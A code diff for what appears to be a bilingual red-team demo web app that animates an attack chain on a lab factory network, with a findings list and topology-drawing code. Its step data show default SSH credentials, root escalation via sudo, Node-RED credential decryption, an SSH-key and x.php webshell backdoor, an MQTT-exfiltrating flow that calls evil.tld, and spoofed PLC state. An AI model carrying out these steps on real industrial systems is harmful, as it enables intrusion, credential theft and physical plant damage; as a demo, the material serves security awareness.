+        actionDescEs:'Login SSH con las credenciales de fábrica <em>pi : raspberry</em> nunca rotadas. Un atacante en la LAN queda dentro del HMI en cinco segundos.',
+        actionDescEn:'SSH login with the never-rotated factory credentials <em>pi : raspberry</em>. An attacker on the LAN is inside the HMI in five seconds.',
+        effectEs:{ fisico:'Ninguno todavía · shell abierta, sin comandos aún sobre la planta.', operador:'Sin alerta — el HMI no registra logins remotos ni su frecuencia.', downstream:'Acceso interactivo al host que ejecuta Node-RED. Filesystem completo accesible como usuario <em>pi</em>.' },
+        effectEn:{ fisico:'None yet · shell opened, no commands issued to the plant.', operador:'No alert — the HMI does not track remote logins or their frequency.', downstream:'Interactive access to the host running Node-RED. Full filesystem accessible as user <em>pi</em>.' },
+        action:'ssh pi@…', channel:'tcp 192.168.0.5:22',
+        payload:'$ ssh pi@192.168.0.5\npi@192.168.0.5\'s password: raspberry\npi@IOTpi2:~ $',
+        effect:'Shell de usuario pi. Acceso al filesystem completo.',
+        topology:'attacker→pi',
+        impact:{ threat:35, vars:0, pkts:1, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'ssh', data:'pi@192.168.0.5 authenticated', kind:'alert', ts:300 },
+          { topic:'session', data:'interactive shell established', kind:'alert', ts:200 }
+        ]
+      },
+      { phase:'PrivEsc', hotkey:'T3', titleEs:'sudo su · root sin password', titleEn:'sudo su · root without password',
+        narrative:'Usuario pi tiene <em>NOPASSWD: ALL</em> en /etc/sudoers (default Raspbian). Un comando y somos root sin desafío. Control total del dispositivo que ejecuta el HMI de la fábrica.',
+        actionDescEs:'Escalada a UID 0 ejecutando <em>sudo su</em>. <em>/etc/sudoers</em> otorga <em>NOPASSWD: ALL</em> al usuario pi por defecto en Raspbian — no hay desafío.',
+        actionDescEn:'Privilege escalation to UID 0 by running <em>sudo su</em>. <em>/etc/sudoers</em> grants <em>NOPASSWD: ALL</em> to the pi user by Raspbian default — no challenge.',
+        effectEs:{ fisico:'Ninguno directo · el atacante aún no escribe en la planta.', operador:'Sin alerta — <em>auth.log</em> local es editable por el propio root.', downstream:'Acceso a <em>/root</em>, <em>/etc/shadow</em>, journald y el socket de Docker. Control total del dispositivo.' },
+        effectEn:{ fisico:'None directly · attacker has not yet written to the plant.', operador:'No alert — the local <em>auth.log</em> is editable by root itself.', downstream:'Access to <em>/root</em>, <em>/etc/shadow</em>, journald and the Docker socket. Full device control.' },
+        action:'sudo su', channel:'shell local',
+        payload:'pi@IOTpi2:~ $ sudo su\nroot@IOTpi2:/home/pi#',
+        effect:'UID 0. Acceso a /root, /etc/shadow, journald, dockerd, todo.',
+        topology:'attacker→pi',
+        impact:{ threat:50, vars:0, pkts:1, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'sudo', data:'NOPASSWD granted for pi', kind:'crit', ts:200 },
+          { topic:'auth.log', data:'pi : TTY=pts/0 ; PWD=/home/pi ; USER=root', kind:'crit', ts:200 }
+        ]
+      },
+      { phase:'Credential Access', hotkey:'T4', titleEs:'credentialSecret · decrypt AES-256-CTR', titleEn:'credentialSecret · AES-256-CTR decrypt',
+        narrative:'Lectura directa de <em>/home/pi/.node-red/.config.json</em> — ahí está la clave que cifra el archivo de credenciales del Node-RED. La llave y el contenedor viven en el mismo filesystem. Descifrado AES-256-CTR de todas las contraseñas MQTT/HTTP/API almacenadas.',
+        actionDescEs:'Lectura de <em>.config.json</em>, extracción del <em>credentialSecret</em> y descifrado AES-256-CTR de <em>flows_cred.json</em>. Llave y contenedor viven en el mismo filesystem.',
+        actionDescEn:'Read <em>.config.json</em>, extract the <em>credentialSecret</em>, and AES-256-CTR-decrypt <em>flows_cred.json</em>. Key and container live on the same filesystem.',
+        effectEs:{ fisico:'Ninguno · robo de credenciales, sin tráfico a la planta aún.', operador:'Sin alerta — no existe monitor de integridad en Node-RED ni auditoría de lectura.', downstream:'Todas las contraseñas MQTT, tokens HTTP y sesiones OPC-UA del HMI quedan en manos del atacante. Habilita los pasos MQTT + OPC-UA.' },
+        effectEn:{ fisico:'None · credential theft, no traffic to the plant yet.', operador:'No alert — Node-RED has no integrity monitor nor read auditing.', downstream:'Every MQTT password, HTTP token, and OPC-UA session used by the HMI is now in attacker hands. Enables the MQTT + OPC-UA steps.' },
+        action:'cat + decrypt', channel:'/home/pi/.node-red/',
+        payload:'credentialSecret: 85a3cdcb38f3cf1b8560016b906b593f9e611f1c4b2172cf13dccf749bd4c3e3\n→ python3 decrypt_nodered_cred.py --auto\n→ MQTT password "orange"  HTTP token "bearer ey…"',
+        effect:'Todas las credenciales Node-RED descifradas. MQTT, APIs, OPC-UA.',
+        topology:'attacker→pi',
+        impact:{ threat:65, vars:0, pkts:2, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'.config.json', data:'credentialSecret extracted', kind:'crit', ts:200 },
+          { topic:'decrypt', data:'AES-256-CTR · 7 credentials recovered', kind:'crit', ts:400 },
+          { topic:'cred',   data:'mqtt_user=ntt_factory pass="orange"', kind:'crit', ts:200 }
+        ]
+      },
+      { phase:'Persistence', hotkey:'T7', titleEs:'Webshell + SSH key · dos vías de vuelta', titleEn:'Webshell + SSH key · two ways back',
+        narrative:'Persistencia doble: (a) SSH key pública inyectada en <em>/home/pi/.ssh/authorized_keys</em>; (b) webshell en <em>/home/pi/.node-red/pub/x.php</em>, servido sin autenticación en <code>http://192.168.0.5:1880/x.php</code>. Si el operador cambia la password de SSH, entramos por HTTP.',
+        actionDescEs:'Persistencia doble e independiente: clave pública SSH en <em>authorized_keys</em> y webshell servida por Node-RED en <em>/pub/x.php</em> sin autenticación.',
+        actionDescEn:'Dual and independent persistence: SSH public key in <em>authorized_keys</em>, plus a webshell served by Node-RED at <em>/pub/x.php</em> with no authentication.',
+        effectEs:{ fisico:'Ninguno · instalación silenciosa de canales de reentrada.', operador:'Sin alerta — rotar la password de SSH no cierra la webshell y viceversa.', downstream:'Reingreso garantizado aunque se remedie una de las dos vías. Remediación parcial deja backdoor activa.' },
+        effectEn:{ fisico:'None · silent installation of re-entry channels.', operador:'No alert — rotating the SSH password does not kill the webshell, and vice versa.', downstream:'Guaranteed re-entry even if one channel is remediated. Partial cleanup leaves a live backdoor.' },
+        action:'write × 2', channel:'/home/pi/.ssh/ + /pub/',
+        payload:'echo "ssh-ed25519 AAAAC3…" >> authorized_keys\ncurl http://pi:1880/x.php?c=id',
+        effect:'Dos canales persistentes independientes. Difícil remediación parcial.',
+        topology:'attacker→pi',
+        impact:{ threat:80, vars:0, pkts:4, stations:['idle','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'file', data:'/home/pi/.ssh/authorized_keys (+1 key)', kind:'crit', ts:200 },
+          { topic:'file', data:'/home/pi/.node-red/pub/x.php (webshell)', kind:'crit', ts:200 },
+          { topic:'http', data:'GET /x.php?c=id → uid=0(root)', kind:'crit', ts:300 }
+        ]
+      },
+      { phase:'Lateral · Node-RED', hotkey:'T5', titleEs:'Flows editor sin autenticación', titleEn:'Flows editor without authentication',
+        narrative:'El editor Node-RED en <em>:1880</em> no tiene adminAuth. Desde el navegador importamos un flow malicioso que intercepta todo el tráfico MQTT y copia credenciales nuevas que pasen. <em>Supply-chain attack del HMI</em> — cualquier contribución externa al repo de flows es ejecutable.',
+        actionDescEs:'Despliegue de un flow malicioso vía <em>POST /flows</em> en el editor Node-RED sin adminAuth. El flow se suscribe a <em>mqtt #</em> y exfiltra credenciales por HTTP.',
+        actionDescEn:'Deploy a malicious flow via <em>POST /flows</em> on the Node-RED editor with no adminAuth. The flow subscribes to <em>mqtt #</em> and exfiltrates credentials over HTTP.',
+        effectEs:{ fisico:'Ninguno aún — el flow observa y copia, todavía no altera comandos.', operador:'HMI aparentemente normal · tráfico extra no salta en los dashboards sin NetFlow.', downstream:'Todo mensaje MQTT de la planta queda replicado en el servidor del atacante. Cualquier credencial rotada se captura en caliente.' },
+        effectEn:{ fisico:'None yet — the flow watches and copies, it does not alter commands yet.', operador:'HMI looks normal · extra traffic does not trigger dashboards without NetFlow.', downstream:'Every plant MQTT message is mirrored to the attacker server. Any rotated credential is captured on the fly.' },
+        action:'POST /flows', channel:'http://192.168.0.5:1880/flows',
+        payload:'Deploy flow · mqtt-in "#" → http-request exfil → function credstealer',
+        effect:'HMI ejecuta código del atacante. Exfil continua en background.',
+        topology:'attacker→pi→hmi',
+        impact:{ threat:90, vars:0, pkts:6, stations:['busy','idle','idle','idle'], camera:'live' },
+        stream:[
+          { topic:'http', data:'POST /flows · 200 OK · 1 flow deployed', kind:'crit', ts:300 },
+          { topic:'node-red', data:'flow "credstealer" started', kind:'crit', ts:200 },
+          { topic:'exfil', data:'→ https://evil.tld/c (ok)', kind:'crit', ts:400 }
+        ]
+      },
+      { phase:'Impact', hotkey:'T8', titleEs:'Pivote a PLC · combined attack', titleEn:'Pivot to PLC · combined attack',
+        narrative:'Con las credenciales extraídas y el Node-RED comprometido: tenemos acceso simultáneo a <em>MQTT + OPC-UA + HMI</em>. El atacante puede mentir a los tres sistemas a la vez, haciendo imposible detectar inconsistencias entre dashboards. Tiempo total desde LAN: <strong>menos de 15 minutos</strong>.',
+        actionDescEs:'Orquestación simultánea sobre <em>MQTT + OPC-UA + HMI</em>: los tres canales publican la misma mentira a la vez. Tiempo total desde la primera IP escaneada: <strong>&lt; 15 min</strong>.',
+        actionDescEn:'Simultaneous orchestration over <em>MQTT + OPC-UA + HMI</em>: all three channels publish the same lie at once. Total time from the first scanned IP: <strong>&lt; 15 min</strong>.',
+        effectEs:{ fisico:'Comandos inconsistentes al PLC · estaciones en error cruzado, cámara congelada, riesgo de daño mecánico.', operador:'Observabilidad cero · los tres dashboards (MQTT, OPC-UA y HMI) cuentan la misma historia falsa, no hay contraste.', downstream:'ERP y supervisión ciegos. Ninguna correlación detecta el ataque. Solo la inspección física revela la realidad.' },
+        effectEn:{ fisico:'Inconsistent commands to the PLC · cross-error stations, camera frozen, mechanical damage risk.', operador:'Zero observability · all three dashboards (MQTT, OPC-UA, HMI) tell the same false story, no contrast.', downstream:'ERP and supervision are blind. No correlation detects the attack. Only physical inspection reveals reality.' },
+        action:'combined chain', channel:'MQTT + OPC-UA + HMI',
+        payload:'mqtt.publish(f/i/state/hbw, BUSY)\nopcua.write(State_HBW, 2)\nnode-red.inject(alert)  ← los 3 canales mienten igual',
+        effect:'Observabilidad cero. Ninguna correlación permite detectar el ataque.',
+        topology:'attacker→full',
+        impact:{ threat:100, vars:61, pkts:120, stations:['error','error','busy','error'], camera:'freeze' },
+        stream:[
+          { topic:'mqtt',   data:'f/i/state/hbw BUSY',         kind:'crit', ts:200 },
+          { topic:'opcua',  data:'State_HBW = 2',              kind:'crit', ts:200 },
+          { topic:'http',   data:'POST /api/ui/alert · injected',kind:'crit', ts:200 },
+          { topic:'i/cam',  data:'frozen frame (heist mode)',   kind:'crit', ts:300 }
+        ]
+      }
+    ]
+  }
+};
+
+/* ============ findings (from findings-report_raspberry.md) ============ */
+const FINDINGS = [
+  { id:'F-01', sev:'critical', txt:'SSH root con credenciales por defecto · pi/raspberry · sudo sin password'},
+  { id:'F-02', sev:'critical', txt:'Node-RED editor sin autenticación · adminAuth comentado'},
+  { id:'F-03', sev:'critical', txt:'OPC-UA securityMode=None · loginEnabled=false · 47 variables expuestas'},
+  { id:'F-04', sev:'critical', txt:'MQTT sin TLS/auth · anónimo aceptado · cleansession=true'},
+  { id:'F-05', sev:'high',     txt:'credentialSecret en cleartext · AES-256-CTR descifrable'},
+  { id:'F-06', sev:'high',     txt:'HTTP plaintext en HMI · requireHttps comentado'},
+  { id:'F-07', sev:'high',     txt:'Raspbian 11 EOL (Jun 2024) · kernel 5.10.63 de Nov 2021'},
+  { id:'F-08', sev:'medium',   txt:'Static content /pub/ sin auth · persistencia vía webshell'},
+  { id:'F-09', sev:'medium',   txt:'Red OT/IT plana · sin VLANs · sin segmentación'},
+  { id:'F-10', sev:'medium',   txt:'Sin logging/SIEM · journald local · trazas borrables'}
+];
+
+/* ============ state ============ */
+const state = { scenario:'mqtt', step:0, lang: (localStorage.getItem('ntt-lang') || 'es') };
+
+/* ============ i18n ============ */
+const I18N = {
+  es: {
+    'brand.tag1':       'Seguridad Ofensiva',
+    'headline.title':   'Tecnología Operacional · Showroom Red Team',
+    'headline.sub':     'Demo de ataque en vivo · engagement autorizado',
+    'status.attack':    'ATAQUE EN CURSO',
+    'sidebar.header':   'Escenarios de ataque',
+    'sidebar.navigate': 'Navegar pasos',
+    'hero.target':      'objetivo',
+    'hero.protocol':    'protocolo',
+    'panel.topology':   'Topología de red · ruta del kill-chain',
+    'panel.action':     'Acción',
+    'panel.narrative':  'Narrativa del ataque',
+    'panel.effect':     'Efecto operativo',
+    'panel.chain':      'Cadena de ataque',
+    'panel.mitigations':'Mitigaciones (este escenario)'
+  },
+  en: {
+    'brand.tag1':       'Offensive Security',
+    'headline.title':   'Operational Technology · Red Team Showroom',
+    'headline.sub':     'Live attack demo · authorized engagement',
+    'status.attack':    'ATTACK IN PROGRESS',
+    'sidebar.header':   'Attack scenarios',
+    'sidebar.navigate': 'Navigate steps',
+    'hero.target':      'target',
+    'hero.protocol':    'protocol',
+    'panel.topology':   'Network topology · kill-chain path',
+    'panel.action':     'Action',
+    'panel.narrative':  'Attack narrative',
+    'panel.effect':     'Operational impact',
+    'panel.chain':      'Attack chain',
+    'panel.mitigations':'Mitigations (this scenario)'
+  }
+};
+function t(key){ return (I18N[state.lang] && I18N[state.lang][key]) || (I18N.es[key] || key); }
+function applyI18n(){
+  document.documentElement.lang = state.lang;
+  document.querySelectorAll('[data-i18n]').forEach(node => {
+    const key = node.getAttribute('data-i18n');
+    node.textContent = t(key);
+  });
+  const lc = el('langCode');
+  if(lc) lc.textContent = state.lang.toUpperCase();
+}
+
+/* ============ renderers ============ */
+function el(id){ return document.getElementById(id); }
+
+function renderSidebar(){
+  const list = el('scenarioList');
+  list.innerHTML = '';
+  Object.entries(SCENARIOS).forEach(([key, sc]) => {
+    const card = document.createElement('div');
+    card.className = 'scenario-card' + (state.scenario===key?' active':'');
+    card.dataset.key = key;
+    const scTitle = (state.lang==='en' && sc.titleEn) ? sc.titleEn : sc.title;
+    card.innerHTML = `
+      <div class="code">${sc.code}</div>
+      <div class="title">${scTitle}</div>
+      <div class="target">${sc.target}</div>
+      <span class="sev ${sc.severity}">${sc.severity}</span>
+    `;
+    card.addEventListener('click', () => setScenario(key));
+    list.appendChild(card);
+  });
+}
+
+function renderScenarioHero(){
+  const sc = SCENARIOS[state.scenario];
+  el('scenarioChip').textContent = sc.code;
+  el('scenarioTitle').textContent = (state.lang==='en' && sc.titleEn) ? sc.titleEn : sc.title;
+  el('scenarioTarget').textContent = sc.target;
+  el('scenarioProto').textContent = (state.lang==='en' && sc.protocolEn) ? sc.protocolEn : sc.protocol;
+}
+
+function renderKillchain(){
+  const sc = SCENARIOS[state.scenario];
+  const nodes = el('kcNodes');
+  nodes.innerHTML = '';
+  sc.steps.forEach((s, i) => {
+    const n = document.createElement('div');
+    let cls = 'kc-node';
+    if(i < state.step) cls += ' visited';
+    if(i === state.step) cls += ' current';
+    if(i === sc.steps.length-1) cls += ' impact';
+    n.className = cls;
+    n.innerHTML = `<div class="bead">${i+1}</div><div class="label">${s.phase}</div>`;
+    n.addEventListener('click', () => setStep(i));
+    nodes.appendChild(n);
+  });
+  const prog = el('kcProgress');
+  const frac = sc.steps.length>1 ? (state.step/(sc.steps.length-1)) : 0;
+  // progress width is calc'd in CSS against the inner track via --kc-pct
+  prog.parentElement.style.setProperty('--kc-pct', String(frac));
+  prog.style.width = '';
+  prog.style.maxWidth = '';
+}
+
+function renderStep(){
+  const sc = SCENARIOS[state.scenario];
+  const s = sc.steps[state.step];
+  const card = el('stepcard');
+  card.classList.remove('fade-enter'); void card.offsetWidth; card.classList.add('fade-enter');
+
+  el('stepNum').textContent = String(state.step+1).padStart(2,'0');
+  el('stepPhase').textContent = s.phase;
+  el('stepTitle').textContent = (state.lang==='en' && s.titleEn) ? s.titleEn : s.titleEs;
+  el('stepHotkey').textContent = s.hotkey;
+  el('stepNarrative').innerHTML = (state.lang==='en' && s.narrativeEn) ? s.narrativeEn : s.narrative;
+
+  // Acción — prose (ported from ShowroomCyberAttacks cards)
+  const actionDesc = (state.lang==='en' && s.actionDescEn) ? s.actionDescEn : (s.actionDescEs || s.action || '');
+  el('stepActionDesc').innerHTML = actionDesc;
+
+  // Efecto operativo — tri-bullet (Físico / Operador / Downstream)
+  const eff = (state.lang==='en' && s.effectEn) ? s.effectEn : (s.effectEs || {});
+  const effTags = state.lang==='en'
+    ? { fisico:'Physical', operador:'Operator', downstream:'Downstream' }
+    : { fisico:'Físico',   operador:'Operador', downstream:'Downstream' };
+  const eul = el('stepEffectList');
+  eul.innerHTML = '';
+  ['fisico','operador','downstream'].forEach(k => {
+    const v = eff[k];
+    if(!v) return;
+    const li = document.createElement('li');
+    li.innerHTML = `<span class="tag">${effTags[k]}</span><span>${v}</span>`;
+    eul.appendChild(li);
+  });
+  // Fallback single-line effect if structured bullets missing
+  if(!eul.children.length && s.effect){
+    const li = document.createElement('li');
+    li.innerHTML = `<span class="tag">${effTags.downstream}</span><span>${s.effect}</span>`;
+    eul.appendChild(li);
+  }
+
+  // Cadena — opcional, solo cuando el step define una secuencia
+  const chain = (state.lang==='en' && s.chainEn) ? s.chainEn : s.chainEs;
+  const chainBlock = el('chainBlock');
+  const chainList = el('chainList');
+  chainList.innerHTML = '';
+  if(Array.isArray(chain) && chain.length){
+    chain.forEach((line, i) => {
+      const li = document.createElement('li');
+      li.innerHTML = `<span class="n">${i+1}</span><span>${line}</span>`;
+      chainList.appendChild(li);
+    });
+    chainBlock.hidden = false;
+  } else {
+    chainBlock.hidden = true;
+  }
+
+  const sev = s.sev || 'info';
+  const sevEl = el('stepSev');
+  sevEl.className = 'sev ' + sev;
+  sevEl.textContent = sev.toUpperCase();
+}
+
+function renderImpact(){
+  const s = SCENARIOS[state.scenario].steps[state.step];
+  drawGauge(s.impact.threat);
+}
+
+function renderMitigations(){
+  const sc = SCENARIOS[state.scenario];
+  const list = (state.lang==='en' && sc.mitigationsEn) ? sc.mitigationsEn : sc.mitigations;
+  const ul = el('mitigationsList');
+  ul.innerHTML = '';
+  list.forEach(m => { const li = document.createElement('li'); li.textContent = m; ul.appendChild(li); });
+}
+
+function renderTopology(){
+  const sc = SCENARIOS[state.scenario];
+  const s = sc.steps[state.step];
+  const active = s.topology || '';
+  const cs = getComputedStyle(document.body);
+  const T = {
+    untrustedStroke: cs.getPropertyValue('--zone-untrusted-stroke').trim() || '#B05245',
+    otStroke:        cs.getPropertyValue('--zone-ot-stroke').trim()        || '#4A7FB5',
+    plantStroke:     cs.getPropertyValue('--zone-plant-stroke').trim()     || '#55996C',
+    otFill:          cs.getPropertyValue('--zone-ot-fill').trim()          || 'rgba(74,143,199,0.035)',
+    plantFill:       cs.getPropertyValue('--zone-plant-fill').trim()       || 'rgba(74,122,92,0.05)',
+    nodeFill1:       cs.getPropertyValue('--topology-node-fill-1').trim()  || '#242B38',
+    nodeFill2:       cs.getPropertyValue('--topology-node-fill-2').trim()  || '#1C232F',
+    stationFill1:    cs.getPropertyValue('--topology-station-fill-1').trim() || '#23302A',
+    stationFill2:    cs.getPropertyValue('--topology-station-fill-2').trim() || '#1A2420',
+    label:           cs.getPropertyValue('--topology-label').trim()        || '#E6E8EB',
+    subLabel:        cs.getPropertyValue('--topology-sub-label').trim()    || '#9AA3B0',
+    legend:          cs.getPropertyValue('--topology-legend').trim()       || '#9AA3B0',
+    edgeIdle:        cs.getPropertyValue('--topology-edge-idle').trim()    || '#3A4252',
+    surfaceBadge:    cs.getPropertyValue('--bg-0').trim()                  || '#0D1117'
+  };
+  // Professional palette lookup — drives all attack colors through CSS tokens
+  const C = {
+    accent:   cs.getPropertyValue('--future-blue').trim()     || '#0072BC',
+    accentHl: cs.getPropertyValue('--future-blue-50').trim()  || '#4A8FC7',
+    green:    cs.getPropertyValue('--green').trim()           || '#4A7A5C',
+    yellow:   cs.getPropertyValue('--yellow').trim()          || '#B88A2A',
+    orange:   cs.getPropertyValue('--orange').trim()          || '#B85C2A',
+    red:      cs.getPropertyValue('--orange-150').trim()      || '#A3342A'
+  };
+
+  // icons per device kind
+  const ICONS = {
+    attacker: `<path d="M-8,-4 L0,-10 L8,-4 L8,6 Q0,12 -8,6 Z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M-3,-1 L-1,3 L4,-3" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>`,
+    broker:   `<circle cx="0" cy="-6" r="2.5" fill="currentColor"/><circle cx="-7" cy="5" r="2.5" fill="currentColor"/><circle cx="7" cy="5" r="2.5" fill="currentColor"/><path d="M0,-4 L-6,4 M0,-4 L6,4 M-5,5 L5,5" stroke="currentColor" stroke-width="1.4"/>`,
+    pi:       `<rect x="-9" y="-6" width="18" height="12" rx="1.5" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="-5" cy="-2" r="1.2" fill="currentColor"/><rect x="-2" y="-4" width="5" height="3" fill="currentColor"/><rect x="-7" y="2" width="3" height="2" fill="currentColor"/><rect x="-2" y="2" width="8" height="2" fill="currentColor"/>`,
+    plc:      `<rect x="-10" y="-7" width="20" height="14" rx="1.5" fill="none" stroke="currentColor" stroke-width="1.6"/><line x1="-5" y1="-7" x2="-5" y2="7" stroke="currentColor" stroke-width="1.2"/><line x1="0" y1="-7" x2="0" y2="7" stroke="currentColor" stroke-width="1.2"/><line x1="5" y1="-7" x2="5" y2="7" stroke="currentColor" stroke-width="1.2"/><circle cx="-2.5" cy="-3" r="1" fill="currentColor"/><circle cx="2.5" cy="-3" r="1" fill="currentColor"/>`,
+    station:  `<rect x="-7" y="-6" width="14" height="12" rx="1.5" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="0" cy="0" r="2.2" fill="currentColor"/>`
+  };
+
+  const nodes = [
+    { id:'attacker', x: 90,  y:210, label:'Attacker',     sub:'kali · 192.168.0.66', icon:'attacker', zone:'untrusted' },
+    { id:'broker',   x:330,  y:110, label:'MQTT Broker',  sub:'192.168.0.10 : 1883', icon:'broker',   zone:'ot' },
+    { id:'pi',       x:330,  y:310, label:'Node-RED HMI', sub:'192.168.0.5 : 1880',  icon:'pi',       zone:'ot' },
+    { id:'plc',      x:580,  y:210, label:'S7-1500 PLC',  sub:'192.168.0.1 : 4840',  icon:'plc',      zone:'ot' },
+    { id:'hbw',      x:820,  y: 90, label:'HBW', sub:'High-Bay W.',    icon:'station', zone:'plant' },
+    { id:'vgr',      x:840,  y:175, label:'VGR', sub:'Vacuum Gripper', icon:'station', zone:'plant' },
+    { id:'mpo',      x:840,  y:250, label:'MPO', sub:'Multi-Proc.',    icon:'station', zone:'plant' },
+    { id:'sld',      x:820,  y:335, label:'SLD', sub:'Sorting Line',   icon:'station', zone:'plant' }
+  ];
+  const kindColor = { mqtt: C.accent, opcua: C.accentHl, ssh: C.yellow, io: T.edgeIdle };
+  const edges = [
+    { from:'attacker', to:'broker', kind:'mqtt' },
+    { from:'attacker', to:'pi',     kind:'ssh'  },
+    { from:'attacker', to:'plc',    kind:'opcua'},
+    { from:'broker',   to:'pi',     kind:'mqtt' },
+    { from:'broker',   to:'plc',    kind:'mqtt' },
+    { from:'pi',       to:'plc',    kind:'opcua'},
+    { from:'plc', to:'hbw', kind:'io' },
+    { from:'plc', to:'vgr', kind:'io' },
+    { from:'plc', to:'mpo', kind:'io' },
+    { from:'plc', to:'sld', kind:'io' }
+  ];
+
+  const activeEdges = {
+    'attacker→broker':     ['attacker-broker'],
+    'attacker→broker→plc': ['attacker-broker','broker-plc'],
+    'attacker→broker→hmi': ['attacker-broker','broker-pi'],
+    'attacker→broker→txt': ['attacker-broker','broker-pi'],  // PTU dance · TXT camera lives off the Node-RED side
+    'attacker→plc':        ['attacker-plc'],
+    'attacker→plc→hmi':    ['attacker-plc','pi-plc'],
+    'attacker→pi':         ['attacker-pi'],
+    'attacker→pi→hmi':     ['attacker-pi','broker-pi'],
+    'attacker→all':        ['attacker-broker','attacker-pi','attacker-plc'],
+    'attacker→full':       ['attacker-broker','attacker-pi','attacker-plc','broker-plc','pi-plc']
+  }[active] || [];
+  const compromisedNodes = new Set();
+  activeEdges.forEach(e => e.split('-').forEach(n => compromisedNodes.add(n)));
+  compromisedNodes.add('attacker'); // always the source
+
+  const W=960, H=400;
+  const findN = id => nodes.find(n => n.id===id);
+  const radiusFor = id => id==='plc' ? 26 : id==='broker'||id==='pi' ? 24 : id==='attacker' ? 26 : 20;
+  const ringColor = id => compromisedNodes.has(id) ? C.red : (id==='attacker' ? C.red : id==='broker' ? C.accent : id==='pi' ? C.yellow : id==='plc' ? C.accentHl : C.green);
+
+  // Dynamic viewBox — fit the actual container aspect so no dead space above or below.
+  // Content (zones + nodes) lives in y ∈ [40, 380], centered at y=210.
+  const topoEl = el('topology');
+  const rect = topoEl ? topoEl.getBoundingClientRect() : { width: 960, height: 380 };
+  const contW = Math.max(rect.width, 1);
+  const contH = Math.max(rect.height, 1);
+  // target viewBox H so SVG aspect = container aspect
+  const targetH = W * (contH / contW);
+  // clamp so content always fits and never zooms in past comfort
+  const viewH = Math.max(360, Math.min(720, targetH));
+  const viewY = 210 - viewH/2; // keep content centered around y=210
+
+  let svg = `<svg viewBox="0 ${viewY} ${W} ${viewH}" preserveAspectRatio="xMidYMid meet">`;
+
+  // defs: gradients, filters, markers
+  const isLight = document.body.dataset.theme === 'light';
+  const attackerStop0 = isLight ? '#F0DCD8' : '#2A1614';
+  const attackerStop1 = isLight ? '#E3C8C2' : '#1A0E0D';
+  svg += `<defs>
+    <radialGradient id="gAttacker" cx="50%" cy="40%" r="60%">
+      <stop offset="0%" stop-color="${attackerStop0}"/><stop offset="100%" stop-color="${attackerStop1}"/>
+    </radialGradient>
+    <radialGradient id="gNode" cx="50%" cy="40%" r="60%">
+      <stop offset="0%" stop-color="${T.nodeFill1}"/><stop offset="100%" stop-color="${T.nodeFill2}"/>
+    </radialGradient>
+    <radialGradient id="gStation" cx="50%" cy="40%" r="60%">
+      <stop offset="0%" stop-color="${T.stationFill1}"/><stop offset="100%" stop-color="${T.stationFill2}"/>
+    </radialGradient>
+    <filter id="glow" x="-50%" y="-50%" width="200%" height="200%">
+      <feGaussianBlur stdDeviation="2" result="b"/>
+      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+    <filter id="softshadow" x="-50%" y="-50%" width="200%" height="200%">
+      <feDropShadow dx="0" dy="2" stdDeviation="2" flood-color="${isLight?'#1E2937':'#000'}" flood-opacity="${isLight?'0.14':'0.40'}"/>
+    </filter>
+    <marker id="arrR" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,1 L9,5 L0,9 Z" fill="${C.red}"/></marker>
+    <marker id="arrN" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,2 L8,5 L0,8 Z" fill="${T.edgeIdle}" opacity="0.7"/></marker>
+  </defs>`;
+
+  // zones (soft backgrounds)
+  const untrustedLabel = isLight ? '#A0332A' : '#E08577';
+  const otLabel = isLight ? C.accent : C.accentHl;
+  const plantLabel = isLight ? '#3F6B50' : C.green;
+  svg += `
+    <g opacity="${isLight?'0.95':'0.82'}">
+      <rect x="14" y="40" width="170" height="340" rx="16" fill="url(#gAttacker)" stroke="${T.untrustedStroke}" stroke-width="1.4" stroke-dasharray="5 5"/>
+      <text x="99" y="64" text-anchor="middle" fill="${untrustedLabel}" font-family="ui-monospace,Consolas" font-size="12" font-weight="700" letter-spacing="3">UNTRUSTED</text>
+      <rect x="218" y="40" width="462" height="340" rx="16" fill="${T.otFill}" stroke="${T.otStroke}" stroke-width="1.4" stroke-dasharray="5 5"/>
+      <text x="449" y="64" text-anchor="middle" fill="${otLabel}" font-family="ui-monospace,Consolas" font-size="12" font-weight="700" letter-spacing="3">OT NETWORK · 192.168.0.0/24</text>
+      <rect x="716" y="40" width="230" height="340" rx="16" fill="${T.plantFill}" stroke="${T.plantStroke}" stroke-width="1.4" stroke-dasharray="5 5"/>
+      <text x="831" y="64" text-anchor="middle" fill="${plantLabel}" font-family="ui-monospace,Consolas" font-size="12" font-weight="700" letter-spacing="3">FACTORY FLOOR</text>
+    </g>`;
+
+  // edges (below nodes)
+  edges.forEach(e => {
+    const a = findN(e.from), b = findN(e.to);
+    const ra = radiusFor(a.id), rb = radiusFor(b.id);
+    const dx = b.x - a.x, dy = b.y - a.y, len = Math.hypot(dx, dy);
+    const ux = dx/len, uy = dy/len;
+    const x1 = a.x + ux*ra, y1 = a.y + uy*ra;
+    const x2 = b.x - ux*rb, y2 = b.y - uy*rb;
+    const key = e.from+'-'+e.to;
+    const isActive = activeEdges.includes(key);
+    const color = isActive ? C.red : kindColor[e.kind];
+    const w  = isActive ? 3.0 : 1.6;
+    const op = isActive ? 1 : 0.38;
+
+    if(isActive){
+      // glow halo line
+      svg += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${color}" stroke-width="6" opacity="0.38" stroke-linecap="round" filter="url(#glow)"/>`;
+    }
+    svg += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${color}" stroke-width="${w}" opacity="${op}" stroke-linecap="round" ${isActive?'stroke-dasharray="8 6"':''} marker-end="${isActive?'url(#arrR)':'url(#arrN)'}">`;
+    if(isActive){
+      svg += `<animate attributeName="stroke-dashoffset" from="56" to="0" dur="1.1s" repeatCount="indefinite"/>`;
+    }
+    svg += `</line>`;
+
+    // animated particle traveling along active edge
